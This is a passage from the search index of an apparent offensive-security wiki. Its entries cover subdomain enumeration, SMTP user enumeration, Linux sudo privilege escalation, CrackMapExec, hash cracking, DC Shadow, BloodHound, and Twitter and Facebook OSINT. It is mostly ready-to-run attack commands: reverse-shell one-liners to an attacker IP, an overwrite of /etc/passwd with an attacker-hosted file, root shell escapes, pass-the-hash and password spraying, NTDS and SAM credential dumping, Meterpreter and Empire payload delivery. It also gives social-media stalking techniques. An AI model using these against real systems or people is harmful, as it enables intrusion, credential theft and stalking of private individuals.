ticket.kirbi"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/subdomain_enumeration/",
	"title": "Subdomain Enumeration",
	"tags": [],
	"description": "",
	"content": " Google Dorks \u0026amp; Bing Dorks # Google dorks are usefull for finding new subdomains site:wikipedia.org site:*.wikipedia.org -www -store -jobs -uk # Bing also support dorks and can give others results site: \nOnline DNS tools and services # VirusTotal runs its own passive DNS replication service # DNS Dumpster can also find large number of sub-domains \nOWASP Amass # OWASP Amass tool suite is used to build a network map of the target # It relies for subdomain enumeration on scrapping data-sources, recursive bruteforcing, crawling web services, permuting names and reverse DNS sweeping # Basic use (DNS lookups and name alterations) amass -d example.com # Brute force subdomain enumeration and print data sources and ip for discovered names amass -src -ip -brute -d example.com # Passiv mode amass -passiv -d example.com # Importing Amass results into Maltego amass -src -ip --active -brute -do owasp.json -d owasp.org amass.viz -i owasp.json --maltego owasp.csv → Then import csv files \nCertificate Transparency # It\u0026#39;s a project started by Google to log and audit SSL/TLS certificates for every CA # Interesting because you can request these certificates using some tools https://crt.sh/ https://censys.io/ https://developers.facebook.com/tools/ct/ https://transparencyreport.google.com/https/certificates # crt.sh also provides public access to their CT logs using postgresql interface psql -h crt.sh -p 5432 -U guest certwatch # Appsecco wrote some scripts to automate these queries https://github.com/appsecco/the-art-of-subdomain-enumeration https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration # You can use ct.py and massdns to find resolvable or not subdomains ./ct.py icann.org | ./bin/massdns -r resolvers.txt -t A -q -a -o -w icann_resolvable_domains.txt - # Another tool is ct-exposer ct-exposer.py -d domain.com \nDNS Enumeration Tools # DNSRecon is a powerfull enumeration tool dnsrecon.py -h dnsrecon.py -d domain.fr # You can do dictionnary enumeration # -n : nameserver used # -t : type (brt=brute domain and hosts using a given dictionnary) dnsrecon.py -n ns1.insecuredns.com -d insecuredns.com -D subdomains-top1mil-5000.txt -t brt # dnsenum is another tool dnsenum domain.fr # Subdomains bruteforce python sublist3r.py -d domain.fr # DNS enumeration and information gathering using fierce (not really passiv) fierce -dns domain.fr # Aquatone is also a great tool \nKnockpy # Knockpy is a python tool designed to enumerate subdomains on a target # domain through a wordlist. It is designed to scan for DNS zone transfer # and to try to bypass the wildcard DNS record automatically if it is enabled. # Now knockpy supports queries to VirusTotal subdomains, you can set # the API_KEY within the config.json file. # Classic research with internal wordlist knockpy domain.com # Use a specific wordlist knockpy domain.com -w wordlist.txt # Resolve IP knockpy -r domain.com or IP # Save output to CSV knockpy -c domain.com # export in JSON knockpy -j domain.com \nPermutation Scanning # Another technique is to use permutations, alterations and mutations of known subdomains to find new ones # Tools like altdns.py can do that # -i : already known subdomains used in input # -o : file containing a massiv list of permuted subdomains # -w : words usef for permutations # -r : resolve each newly generated subdomain # -s : result for the resolved permuted subdomains altdns.py -i icann.domains -o data_output -w icann.words -r -s results_output.txt  \nAutonomous System (AS) Numbers # You can use ASN to identify netblocks belonging to a company # Resolve the IP of a given domain, using dig or host # Then look for the ASN associated https://asn.cymru.com/cgi-bin/whois.cgi (given an IP address) https://bgp.he.net/ (given a domain name) # Then you can use nmap NSE scripts to find netblocks for an ASN nmap --script targets-asn --script-args targets-asn.asn=17012 \u0026gt; netblocks.txt # You will get range networks on which you can investigate more \nZone Transfer # DNS transaction where a DNS Server gives a full/part copy of it\u0026#39;s zone file to another DNS Server # If bad configuration, anyone can initiate a zone transfer and so access to the zone file dig +multi AXFR @ns1.insecuredns.com insecuredns.com \nDNSSEC Walking # To prove things that do not exist, DNSSEC list all the things that exist # If the list is proven, then everything not listed must not exist # This list is created by the NSEC (or NSEC3) records # Interesting side-effect, it allows anyone to list the zone content by following the linked list of NSEC records. → zone walking # Tools like ldns-walk can exploit this ldns-walk @ns1.insecuredns.com insecuredns.com ldns-walk insecuredns.com # Some DNSSEC zones uses NSEC3 → Hashed domain names to prevent attackers # It\u0026#39;s still possible to collect hashes and crack them # Tools like nsec3walker ./collect icann.org \u0026gt; icann.org.collect cat icann.org.unhash | grep \u0026#34;icann\u0026#34; | awk \u0026#39;{print $2;}\u0026#39; \nProject Collecting Data # Some projects collect data and provide them to the community # ForwardDNS dataset is a part of Project Sonar # This dataset is created by extracting domain names from a number of sources and then sending an ANY query for each domain # You can download the dataset and parse it but IT\u0026#39;S HUGE (20Gb compressed, 300+ Gb uncompressed) # It seems to be the best solution to find subdomains curl -silent https://scans.io/data/rapid7/sonar.fdns_v2/20170417-fdns.json.gz | pigz -dc | grep “.icann.org” | jq"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/",
	"title": "Technical Recon",
	"tags": [],
	"description": "",
	"content": " Table of Content  General  Firefox Add-ons  Technical Recon  Domains \u0026amp; IP Subdomain Enumeration Web Application Firewall (WAF) Dorks Company General Informations Public Documents and Metadata Photon MISC Frameworks \u0026amp; Correlation  Hosting \u0026amp; Repositories  Github Amazon \u0026amp; Digital Ocean Buckets  Human Recon  Social Networks E-mails Password Leaks Searching Someone Skiptracer Geolocation  Buscador  "
},
{
	"uri": "/open-source-intelligence-osint/human-recon/social-networks/twitter/",
	"title": "Twitter",
	"tags": [],
	"description": "",
	"content": " Tips \u0026amp; Tricks # With spoonbill, you can check and record people accounts modification # It checks accounts of people you\u0026#39;re following https://tweepsect.com/ # When was created an account http://twbirthday.com/***REMOVED***/ # Find stalker (checks who\u0026#39;s following and who\u0026#39;s followed) and intersect them https://tweepsect.com/ # You can triangulate accounts by looking who\u0026#39;s following x+x or who y+y follows http://twiangulate.com # Search using geocode geocode:36.1143855,-115.1727518,1km # Tweeter account analysis (account needed) https://tweetreach.com/ # Sleeping time (account needed) http://sleepingtime.org/ # See all tweets from one account (account needed) https://www.allmytweets.net/connect/ # Simple analysis https://socialbearing.com/search/general/sodifrance \nTweet Analyzer (https://github.com/x0rz/tweets_analyzer) # The goal of this simple python script is to analyze a Twitter profile through its tweets by detecting: # Average tweet activity, by hour and by day of the week # Timezone and language set for the Twitter interface # Sources used (mobile application, web browser, ...) # Geolocations # Most used hashtags, most retweeted users and most mentioned users # Friends analysis based on most frequent timezones/languages # Basic python tweets_analyzer.py -n \u0026lt;@username\u0026gt; \nTwitter Intelligence (https://github.com/batuhaniskr/twitter-intelligence) # Another tool used to analyze twitter accounts # SQLite database is used # Search by username python3 tracking.py --username \u0026#34;HaberSau\u0026#34; # Search by query python3 tracking.py --query \u0026#34;sakarya\u0026#34; # Search in a time range python3 tracking.py --username \u0026#34;HaberSau\u0026#34; --since 2015-09-10 --until 2015-09-12 --maxtweets 10 # Get location (slower) python3 tracking.py --query \u0026#34;sakarya\u0026#34; --location \u0026#34;True\u0026#34; # Location analysis (you need to get Google API Key in settings.py) python3 analysis py --location \nTwitter Back From The Death # This tool checks an user account history to get tweets # It then parses tweets to extract all URL links and then # Checks if the domain is available for registration https://github.com/misterch0c/twitterBFTD \nTwint https://github.com/twintproject/twint"
},
{
	"uri": "/recon-enumeration/services-enumeration/25_smtp/",
	"title": "25 - SMTP",
	"tags": [],
	"description": "",
	"content": " Identification # Connection and test using telnet telnet \u0026lt;IP\u0026gt; 25 EHLO \u0026lt;IP\u0026gt; VRFY root EXPN root Mail from: me@test.com To: root@test.com Data: Subject: Message Hi, Just a test message. (Double carriage return) \nEnumeration # using smtp-user-enum script smtp-user-enum -M VRFY -U users.txt -t \u0026lt;IP\u0026gt;"
},
{
	"uri": "/linux-systems/privilege-escalation/abusing_sudo_programs/",
	"title": "Abusing sudo programs",
	"tags": [],
	"description": "",
	"content": " Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://gtfobins.github.io/ \nGeneral Information # Get privileges for users sudo -l /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root): install -mode 4755 /bin/dash /tmp/sh Then you will have a /tmp/sh that gives any user who calls it root ! # Some payloads to overcome limited shells ssh user@$ip nc $localip 4444 -e /bin/sh python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; export TERM=linux # Python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39; python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026#34;$ip\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(), *$ 1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; # Bash echo os.system(\u0026#39;/bin/bash\u0026#39;) /bin/sh -i exec \u0026#34;/bin/sh\u0026#34;; # Perl perl —e \u0026#39;exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; \nAbusing tools and programs # The following are presented : # - strace # - tcpdump # - mount # - apache2 # - wget # - nano # - awk # - man # - less # - more # - nmap # - vim # - find # - tar # - zip # - gdb # - script # - scp # - ssh # - git # - rvim # - pico # - rbash# strace sudo strace -o/dev/null /bin/bash# tcpdump $ echo $’id\\ncat /etc/shadow’ \u0026gt; /tmp/.test $ chmod +x /tmp/.test $ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root# mount sudo mount -o bind /bin/bash /bin/mount sudo mount# apache2 sudo apache2 -f /etc/shadow Syntax error on line 1 of /etc/shadow: Invalid command \u0026#39;root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::\u0026#39;, perhaps misspelled or defined by a module not included in the server configuration# wget # Attacker side # - Copy target\u0026#39;s file /etc/passwd # - Append this line only (password: test) : # touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash # - Host the file # Victim side # - sudo wget http://ip/filePasswd -O /etc/passwd # - su touhid # nano sudo nano /etc/passwd # Add this: # touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash # Now you can: su touhid with password test# awk sudo awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39;# man sudo man man !sh#less sudo less /etc/hosts !sh# more sudo more /etc/hosts !sh#nmap # With --interactive: sudo nmap --interactive nmap\u0026gt; !sh #With --script: echo \u0026#34;os.execute(\u0026#39;/bin/sh\u0026#39;)\u0026#34; \u0026gt; /tmp/shell.nse \u0026amp;\u0026amp; sudo nmap --script=/tmp/shell.nse# vim sudo vim -c \u0026#39;!sh\u0026#39;# find sudo find /etc/passwd -exec /bin/sh \\; sudo find /bin -name nano -exec /bin/sh \\;# tar sudo -u user tar --checkpoint=1 --checkpoint-action=exec=/bin/bash -cf /tmp/12345.tar /dev/zero# zip # Create script.sh and chmod 777 → /bin/bash \u0026gt;\u0026amp;2 0\u0026gt;\u0026amp;2 touch /tmp/xyz; chmod 444 /tmp/xyz sudo -u user zip /tmp/zzz.zip /tmp/xyz -T -TT /tmp/script.sh# gdb sudo -u user gdb -q (gdb) shell# script sudo -u user script /tmp/what-ever# scp # Create script.sh and chmod 777 → /bin/bash \u0026gt;\u0026amp;2 0\u0026gt;\u0026amp;2 sudo -u user scp -vv -C -S tmp/script.sh a whatever# ssh # Create script.sh and chmod 777 → /bin/bash \u0026gt;\u0026amp;2 0\u0026gt;\u0026amp;2 sudo -u user ssh -o ProxyCommand=/tmp/script.sh lel# git # Create script.sh and chmod 777 → /bin/bash \u0026gt;\u0026amp;2 0\u0026gt;\u0026amp;2 sudo -u user git -c core.pager=/tmp/script.sh --paginate help# rvim rvim version | grep python echo “import os;os.system(\u0026#39;bash\u0026#39;)” \u0026gt; /tmp/script.py sudo -u rvim -c \u0026#34;pyfile /tmp/script.py\u0026#34;# pico sudo -u user pico # Type bash in editor an press ^T to trigger spellchecker# rbash ???"
},
{
	"uri": "/windows-systems/exploitation/crackmapexec/",
	"title": "CrackMapExec",
	"tags": [],
	"description": "",
	"content": " TOC  Connexions \u0026amp; Spraying Enumeration Execution \u0026amp; Co Getting credentials Using the database Modules Getting shells  # General help crackmapexec --help # Protocol help cracmapexec smb --help \nConnexions \u0026amp; Spraying # Target format crackmapexec smb ms.evilcorp.org crackmapexec smb 192.168.1.0 192.168.0.2 crackmapexec smb 192.168.1.0-28 10.0.0.1-67 crackmapexec smb 192.168.1.0/24 crackmapexec smb targets.txt# Null session crackmapexec smb 192.168.10.1 -u \u0026#34;\u0026#34; up \u0026#34;\u0026#34;# Connect to target using local account crackmapexec smb 192.168.215.138 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASSWORD\u0026#39; --local-auth# Pass the hash against a subnet crackmapexec smb 172.16.157.0/24 -u administrator -H \u0026#39;LMHASH:NTHASH\u0026#39; --local-auth crackmapexec smb 172.16.157.0/24 -u administrator -H \u0026#39;NTHASH\u0026#39;# Bruteforcing and Password Spraying crackmapexec smb 192.168.100.0/24 -u \u0026#34;admin\u0026#34; -p \u0026#34;password1\u0026#34; crackmapexec smb 192.168.100.0/24 -u \u0026#34;admin\u0026#34; -p \u0026#34;password1\u0026#34; \u0026#34;password2\u0026#34; crackmapexec smb 192.168.100.0/24 -u \u0026#34;admin1\u0026#34; \u0026#34;admin2\u0026#34; -p \u0026#34;P@ssword\u0026#34; crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt \nEnumeration Users # Enumerate users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --users # Perform RID Bruteforce to get users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --rid-brute # Enumerate domain groups crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --groups # Enumerate local users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --local-users Hosts # Generate a list of relayable hosts (SMB Signing disabled) crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt # Enumerate available shares crackmapexec smb 192.168.215.138 -u \u0026#39;user\u0026#39; -p \u0026#39;PASSWORD\u0026#39; --local-auth --shares # Get the active sessions crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --sessions # Check logged in users crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --lusers # Get the password policy crackmapexec smb 192.168.215.104 -u \u0026#39;user\u0026#39; -p \u0026#39;PASS\u0026#39; --pass-pol \nExecution \u0026amp; Co # CrackMapExec has 3 different command execution methods (in default order) : # - wmiexec --\u0026gt; WMI # - atexec --\u0026gt; scheduled task # - smbexec --\u0026gt; creating and running a service # Execute command through cmd.exe (admin privileges required) crackmapexec smb 192.168.10.11 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; -x \u0026#39;whoami\u0026#39; # Force the smbexec method crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -x \u0026#39;net user Administrator /domain\u0026#39; --exec-method smbexec # Execute commands through PowerShell (admin privileges required) crackmapexec smb 192.168.10.11 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; -X \u0026#39;whoami\u0026#39; \nGetting Credentials # Dump local SAM hashes crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth --sam# Enable or disable WDigest to get credentials from the LSA Memory crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth --wdigest enable crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth --wdigest disable # Then you juste have to wait the user logoff and logon again # But you can force the logoff crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -x \u0026#39;quser\u0026#39; crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -x \u0026#39;logoff \u0026lt;sessionid\u0026gt;\u0026#39;# Dump the NTDS.dit from DC using methods from secretsdump.py # Uses drsuapi RPC interface create a handle, trigger replication # and combined with additional drsuapi calls to convert the resultant # linked-lists into readable format crackmapexec smb 192.168.1.100 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --ntds # Uses the Volume Shadow copy Service crackmapexec smb 192.168.1.100 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --ntds vss # Dump the NTDS.dit password history smb 192.168.1.0/24 -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --ntds-history \nUsing the database # The database automatically store every hosts reaches by CME and all credentials with admin access $ cmedb # Using workspaces cmedb\u0026gt; workspace create test cmedb\u0026gt; workspace test # Access a protocol database and switch back cmedb (test)\u0026gt; proto smb cmedb (test)\u0026gt; back # List stored hosts cmedb\u0026gt; hosts # View detailed infos for a specific machine (including creds) cmedb\u0026gt; hosts \u0026lt;hostname\u0026gt; # Get stored credentials cmedb\u0026gt; creds # Get credentials access for a specific account cmedb\u0026gt; creds \u0026lt;username\u0026gt; # Using credentials from the database crackmapexec smb 192.168.100.1 -id \u0026lt;credsID\u0026gt; \nModules # List available modules crackmapexec smb -L # Module information crackmapexec smb -M mimikatz --module-info # View module options crackmapexec smb -M mimikatz --options # Mimikatz module crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth -M mimikatz crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; -M mimikatz crackmapexec smb 192.168.215.104 -u Administrator -p \u0026#39;P@ssw0rd\u0026#39; -M mimikatz -o COMMAND=\u0026#39;privilege::debug\u0026#39;[*] Get-ComputerDetails Enumerates sysinfo [*] bloodhound Executes the BloodHound recon script on the target and retreives the results to the attackers\\\u0026#39; machine [*] empire_exec Uses Empire\\\u0026#39;s RESTful API to generate a launcher for the specified listener and executes it [*] enum_avproducts Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI [*] enum_chrome Decrypts saved Chrome passwords using Get-ChromeDump [*] enum_dns Uses WMI to dump DNS from an AD DNS Server [*] get_keystrokes Logs keys pressed, time and the active window [*] get_netdomaincontroller Enumerates all domain controllers [*] get_netrdpsession Enumerates all active RDP sessions [*] get_timedscreenshot Takes screenshots at a regular interval [*] gpp_autologin Searches the domain controller for registry.xml to find autologon information and returns the username and password. [*] gpp_password Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences. [*] invoke_sessiongopher Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher [*] invoke_vnc Injects a VNC client in memory [*] met_inject Downloads the Meterpreter stager and injects it into memory [*] mimikatz Dumps all logon credentials from memory [*] mimikatz_enum_chrome Decrypts saved Chrome passwords using Mimikatz [*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager [*] mimikittenz Executes Mimikittenz [*] multirdp Patches terminal services in memory to allow multiple RDP users [*] netripper Capture`\\\u0026#39;s credentials by using API hooking [*] pe_inject Downloads the specified DLL/EXE and injects it into memory [*] rdp Enables/Disables RDP [*] scuffy Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares [*] shellcode_inject Downloads the specified raw shellcode and injects it into memory [*] slinky Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions [*] test_connection Pings a host [*] tokens Enumerates available tokens [*] uac Checks UAC status [*] wdigest Creates/Deletes the \u0026#39;UseLogonCredential\u0026#39; registry key enabling WDigest cred dumping on Windows \u0026gt;= 8.1 [*] web_delivery Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module \nGetting shells Metasploit # First, set up a HTTP Reverse Handler msf \u0026gt; use exploit/multi/handler msf exploit(handler) \u0026gt; set payload windows/meterpreter/reverse_https msf exploit(handler) \u0026gt; set LHOST 192.168.10.3 msf exploit(handler) \u0026gt; set exitonsession false msf exploit(handler) \u0026gt; exploit -j # Met_Inject module crackmapexec smb 192.168.215.104 -u \u0026#39;Administrator\u0026#39; -p \u0026#39;PASS\u0026#39; --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444  Empire # Start RESTful API empire --rest --user empireadmin --pass gH25Iv1K68@^ # First setup an Empire HTTP listener (Empire: listeners) \u0026gt; set Name test (Empire: listeners) \u0026gt; set Host 192.168.10.3 (Empire: listeners) \u0026gt; set Port 9090 (Empire: listeners) \u0026gt; set CertPath data/empire.pem (Empire: listeners) \u0026gt; run (Empire: listeners) \u0026gt; list # Start RESTful API # The username and password that CME uses to authenticate to Empire\u0026#39;s RESTful API # Are stored in the cme.conf file located at ~/.cme/cme.conf empire --rest --user empireadmin --pass gH25Iv1K68@^ # Empire Module crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest"
},
{
	"uri": "/passcracking-hashfiles/cracking_files/",
	"title": "Cracking files",
	"tags": [],
	"description": "",
	"content": " Cracking archives # RAR rar2john file.rar \u0026gt; rar_hashes.txt john --wordlist=passwords.txt rar_hashes.txt # ZIP zip2john file.rar \u0026gt; zip_hashes.txt john --wordlist=passwords.txt zip_hashes.txt # ZIP Using fcrackzip fcrackzip -u -D -p rockyou.txt recup.zip \nCracking shadow files unshadow passwd shadow \u0026gt; shadowjohn.txt john --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --rules shadowjohn.txt john --show shadowjohn.txt # Hashcat SHA512 $6$ shadow file hashcat -m 1800 -a 0 hash.txt rockyou.txt --username #Hashcat MD5 $1$ shadow file hashcat -m 500 -a 0 hash.txt rockyou.txt --username \nVarious cracking techniques # Hashcat MD5 Apache webdav file hashcat -m 1600 -a 0 hash.txt rockyou.txt # Hashcat SHA1 hashcat -m 100 -a 0 hash.txt rockyou.txt --force # Hashcat Wordpress hashcat -m 400 -a 0 --remove hash.txt rockyou.txt # SSH Key ssh2john id_rsa \u0026gt; sshtocrack john --wordlist=/usr/share/wordlists/rockyou.txt sshtocrack # Cracking Cisco passwords # Type 5 → MD5 # Type 7 → Easy reversible hashcat -m 500 c:\\temp\\ciscohash.txt C:\\DICS\\english-dic.txt # Cracking NTLVMv2 hashes john --format=netntlmv2 --wordlist=\u0026#34;/usr/share/wordlists/rockyou.txt\u0026#34; hash.txt  \nCracking TGS # Using John from bleeding repo: Go here /home/user/Desktop/Certifs/OSCP/Tools/PasswordCracking/JohnTheRipper/run ./john --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --fork=4 --format=krb5tgs /home/user/Desktop/HackTheBox/VM/Active/kerberos_hashes.txt"
},
{
	"uri": "/windows-systems/post-exploitation-techniques/dc_shadow/",
	"title": "DC Shadow",
	"tags": [],
	"description": "",
	"content": "# DC Shadow is a post compromission attack, allowing you to update replication metadata # On a compromised client, using a domain admin account # You can attack with Mimikatz# Terminal 1 (runas) mimikatz # !+ mimikatz # !processtoken mimikatz # lsadump::dcshadow /object:dtargaryen /attribute:description /value:\u0026#34;The Game\u0026#34; /replOriginatingUid:{00000000-0000-0000-0000-000000000000} /replOriginatingTime:\u0026#34;2017-01-01 09:00:00\u0026#34; /replOriginatingUsn:42# Terminal 2 (runas) mimikatz # lsadump::dcshadow /push# You can check the success throught repadmin on the DC repadmin /showobjmeta DC01.NORZH.LAN \u0026#34;CN=Daenerys Targaryen,CN=Users,DC=NORZH,DC=LAN\u0026#34;"
},
{
	"uri": "/web-attacks/files-inclusions-and-injections/directory_file_discovery/",
	"title": "Directory &amp; File Discovery",
	"tags": [],
	"description": "",
	"content": " Test for directory traversal  \nGeneral \u0026amp; Tricks # Check for .git # If there is a git, possible to download the source code # Check for temp saved files # Vim creates .swp files index.php/.admin.html.swp # Path traversal cheat sheet https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/ \nPatator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=\u0026#39;Authorization: Basic YOUR_BASE64_HERE\u0026#39;"
},
{
	"uri": "/windows-systems/network-and-domain-recon/domain_mapping/",
	"title": "Domain Mapping",
	"tags": [],
	"description": "",
	"content": " BloodHound Setup # Bloodhound directement depuis la machine cible # apt-get install bloodhound # Setup $ sudo neo4j console ... ... http://localhost:7474 user/pass = neo4j/neo4j # Start $ bloodhound URL : bolt://127.0.0.1:7687 Target Collection # On the target, drop the Sharphound ingestor # You can drop it through shared folder or by download https://github.com/BloodHoundAD/BloodHound https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1 # Powershell Powershell.exe -Exec Bypass Import-Module .\\Sharphound.ps1 Invoke-Bloodhound Invoke-BloodHound -CollectionMethod All # Default : Domains, Computers, Users, Groups # All : Domains, Computers, Users, Groups, OUs, GPOs # Exe # You may need some .NET packages C:\\\u0026gt; SharpHound.exe C:\\\u0026gt; SharpHound.exe — CollectionMethod SessionLoop — MaxLoopTime 1h C:\\\u0026gt; SharpHound.exe — CollectionMethod ACL Analysis # Results will be zipped # Get back zip, unzip it and upload files into bloodhound \nPingCastle Lien : https://www.pingcastle.com/PingCastleFiles/PingCastle_2.4.3.0.zip \u0026gt; Drop exe on the target \u0026gt; Run Pingcastle.exe (mode interactif par défaut) \u0026gt; Healthcare (enter) et domaine (*) \u0026gt; Mode CLI : \u0026gt; PingCastle --healthcheck --server mydomain.com \u0026gt; PingCastle --carto \nADACLScanner TODO\n"
},
{
	"uri": "/windows-systems/exploitation/",
	"title": "Exploitation",
	"tags": [],
	"description": "",
	"content": " Table of Content  Network and Domain Recon  Out of domain (no credentials) Domain Recon Domain Mapping  Local and Physical  Local Recon Enumeration Physical Access  Exploitation  Exploitation Tricks CrackMapExec Impacket Kerberos RDP Exploitation File Transfer  Privilege Escalation  Admin and Processes LSASS and Mimikatz Windows Defender Tricks  Post Exploitation  NTDS Database Silver and Golden Tickets DC Shadow   "
},
{
	"uri": "/open-source-intelligence-osint/human-recon/social-networks/facebook/",
	"title": "Facebook",
	"tags": [],
	"description": "",
	"content": " Tips \u0026amp; Tricks # Stalking and Information Gathering https://stalkscan.com/ # Facebook video downloader https://fbdown.net/ # Find Facebook ID https://findmyfbid.com \nFacebook Tricks # You can search by e-mail # You can find accounts by e-mail with the recover function https://www.facebook.com/login/identify?ctx=recover https://www.facebook.com/login/identify # Search photo by ID https://www.facebook.com/photo.php?fbid=PHOTO-ID-HERE \nFacebook Sleep Stats # A small tool to show the potential privacy implications modern social media have. # By tracking online/offline status of people on Facebook, it is possible to get an accurate image of their sleep pattern. https://github.com/sqren/fb-sleep-stats # Two process are running simultaniously : scrapper and webserver # Scraping npm run scrape # Server (localhost:3000) npm start # Ad blocker must be disabled # When the scrapper is off, it stops tracking \nFacebook Graph Search # Graph Search is a Facebook internal search engine used to get precise results when searching # Facebook need to be in English version to activate the Graph Search # Classic requests are like in natural language Photos of my friends # But some requests give bad results or false positive # Alternative is using the Graph Search through the URL facebook.com/search/str/\u0026lt;search\u0026gt;# Track you Facebook activity My favorites pages My favorites music Books I like Photos I have liked Photos have I like that are recent Places visited by me Places nearby I visited Games I like ...# View photos of friends or even strangers Photos of my friends Photos of my friends of friends taken in \u0026lt;Place\u0026gt; Photos of people named [Name] Photos of (or uploaded by) [Name] Photos of [Name] in (or before or after) [Year] Photos commented on by [Name] Photos liked by [Name] Photos of [Person A] liked by [Person B] Photos of [Person A] AND [Person B] photos taken in Paris, France from 2018 photos taken by phone xperia U Photos of friends of my friends photos of wedding uploaded by friends of my friends photos of graduation uploaded by friends of my friends photos of single friends of my friends uploaded by friends of my friends# Find new places Restaurants nearby liked by my friends [Cuisine] Restaurants liked by my friends of friends in [City] Hotels nearby liked by my friends of friends Friends who live (or have lived) in [Place] Recent photos taken in [Place] Places in [City] visited by people who live nearby# Know your followers People who follow me People who follow me and like [Page Name] People who follow me and live in [City] People who follow me and work at [Company] People who follow me and were born in [Year] Friends of friends who follow me# Find someone People who work nearby People who are [Profession Name] (like Doctors, Programmers, etc.) People who live in [Place] People who are named [Full or Partial Name] People who are [Gender] and live in [City] and [Relationship Status] People who believe in [Religion Name] People who are N years old People who are older than X and younger than Y years People who were born in [Year] People who work at [Company A] and previously worked at [Company B] People who live in Paris People who went to Harvard University friends of my friends friends of my friends who are single friends of my friends who are men interested in men people who live in new york city who uploaded photos taken in versailles# But some requests give bad results or false positive # Alternative is using the Graph Search through the URL facebook.com/search/str/\u0026lt;search\u0026gt; # If there are several searchs you can use AND / OR parameters xxx/intersect xxx/union facebook.com/search/str/\u0026lt;search\u0026gt;/str/secondone/intersect # People who live in Paris (present and past) www.facebook.com/search/str/paris/pages-named/residents/present/ www.facebook.com/search/str/paris/pages-named/residents/past/ # People who live in Ile de France now or in France (code) www.facebook.com/search/str/ile-de-france/pages-named/residents/present/ www.facebook.com/search/str/105604449474183/residents/present/ # Intersect one # People \u0026#34;Patrick\u0026#34; who live in Toulouse now www.facebook.com/search/str/patrick/users-named/str/toulouse/pages-named/residents/present/intersect/ # People \u0026#34;Patrick\u0026#34; who live in Toulouse now and Paris in the past 